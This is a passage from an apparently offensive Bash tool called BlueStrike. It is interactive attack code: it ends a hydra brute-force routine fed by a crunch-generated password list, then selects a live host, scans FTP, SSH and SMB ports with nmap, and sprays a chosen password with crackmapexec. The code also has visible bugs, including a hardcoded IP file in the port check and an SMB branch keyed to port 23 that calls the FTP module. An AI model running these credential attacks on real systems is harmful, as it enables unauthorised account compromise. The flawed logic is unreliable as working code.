	echo -e "${RED}Invalid input${ENDCOLOR}"
	echo -e "${RED}Choose from the available options${ENDCOLOR}"
	echo
fi
done
echo "$(date) - Chosen port - $port" >> /var/log/BlueStrike.log # log
echo "$(date) - Chosen service - $serv_tar" >> /var/log/BlueStrike.log # log
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Username List${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Please provide a path to the user list, with both valid and invalid users"
while true; do
read usr_path
echo
if [ -f "$usr_path" ]; then
	echo -e "${GREEN}[!]${ENDCOLOR} User list found."
	break
else
	echo -e "${RED}[!]${ENDCOLOR} List not found."
	echo -e "${RED}[!]${ENDCOLOR} Please provide a valid path."
fi	
done
echo
echo -e "${YELLOW}[*]${ENDCOLOR} Creating a password list..."
crunch 1 3 -o pass.lst 2>/dev/null
echo
echo "$(date) - Brute-Force attack initialized" >> /var/log/BlueStrike.log # log
echo -e "${RED}${BOLD}[!] Commencing a Brute-Force attack${ENDCOLOR}"
echo -e "${RED}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
hydra -L "$usr_path" -P pass.lst "${serv_tar}://${target_IP}" >/dev/null 2>&1
echo -e "${GREEN}${BOLD}[!] Brute-Force Attack Finished${ENDCOLOR}"
echo -e "${GREEN}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo "$(date) - Brute-Force attack finished" >> /var/log/BlueStrike.log # log
}

function PS() # Password spraying function
{
echo "============================Password Spraying===========================" >> /var/log/BlueStrike.log	
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Password Spraying${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
while true; do
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Target Selection${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo
echo -e "${YELLOW}[1]${ENDCOLOR} Choose target IP"
echo -e "${YELLOW}[2]${ENDCOLOR} Choose one randomly from the live hosts"
echo
echo -ne "${BOLD}Choice:${ENDCOLOR} "
read -r arp_tar
echo
case $arp_tar in
	1)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choose an IP address: "
		line=0
		for ip in $(cat live_hosts.txt); do
			line=$((line + 1))
			echo "[$line] $ip"
		done
		echo
		echo -ne "${BOLD}Choice: ${ENDCOLOR}"
		read -r ip_cho
		target_IP=$(awk "NR==$ip_cho" live_hosts.txt)
		echo
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    2)
		echo -e "${YELLOW}[*]${ENDCOLOR} Choosing a random IP address..."
		echo
		target_IP=$(shuf -n 1 live_hosts.txt)
		echo -e "${YELLOW}[*]${ENDCOLOR} The chosen IP address is ${YELLOW}$target_IP${ENDCOLOR}"
		break
	;;
    *)
		echo -e "${RED}Invalid input${ENDCOLOR}"
		echo -e "${RED}Choose from the available options${ENDCOLOR}"
		echo
	;;
esac
done
echo -e "${YELLOW}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}Port Discovery${ENDCOLOR}"
echo -e "${YELLOW}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Initiating port discovery..."
echo
nmap -p 21,22,445 "$target_IP" > "$target_IP"
echo "$(date) - Found available ports" >> /var/log/BlueStrike.log
echo
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}Username List${ENDCOLOR}"
echo -e "${YELLOW}${BOLD}----------------------------------------------------${ENDCOLOR}"
echo -e "${YELLOW}[*]${ENDCOLOR} Please provide a path to the user list, with both valid and invalid users"
while true; do
read user_path
echo
if [ -f "$user_path" ]; then
	echo -e "${GREEN}[!]${ENDCOLOR} User list found."
	break
else
	echo -e "${RED}[!]${ENDCOLOR} List not found."
	echo -e "${RED}[!]${ENDCOLOR} Please provide a valid path."
fi	
done
echo
echo -ne "${YELLOW}[*]${ENDCOLOR} Please enter a password to spray: "
read -r pass
echo
echo -e "${RED}${BOLD}[!]${ENDCOLOR} Commencing Password Spraying attack"
echo -e "${RED}${BOLD}----------------------------------------------------${ENDCOLOR}"
open_ports=$(grep open 192.168.178.134 | awk -F/ '{print $1}')
for p in 21 22 445; do
echo "$open_ports" | grep -qw "$p" || continue
case "$p" in
	21)
		echo
		echo -e "${RED}[!] Password Spraying FTP${ENDCOLOR}"
		crackmapexec ftp "$target_IP" -u "$user_path" -p "$pass" --continue-on-success > PS_RES.txt # FTP
		echo "$(date) - Password Spraying FTP complete" >> /var/log/BlueStrike.log # log
	;;
	22) 
		echo
		echo -e "${RED}[!] Password Spraying SSH${ENDCOLOR}"
		crackmapexec ssh "$target_IP" -u "$user_path" -p "$pass" --continue-on-success >> PS_RES.txt # SSH
		echo "$(date) - Password Spraying SSH complete" >> /var/log/BlueStrike.log # log
	;;
	23) 
		echo
		echo -e "${RED}[!] Password Spraying SMB${ENDCOLOR}"
		crackmapexec ftp "$target_IP" -u "$user_path" -p "$pass" --continue-on-success >> PS_RES.txt # SMB
		echo "$(date) - Password Spraying SMB complete" >> /var/log/BlueStrike.log # log
	;;
esac
done
echo -e "${GREEN}${BOLD}[!] Password Spraying Attack Finished${ENDCOLOR}"
echo -e "${GREEN}${BOLD}----------------------------------------------------${ENDCOLOR}"
}

MANUAL
ANON
MENU



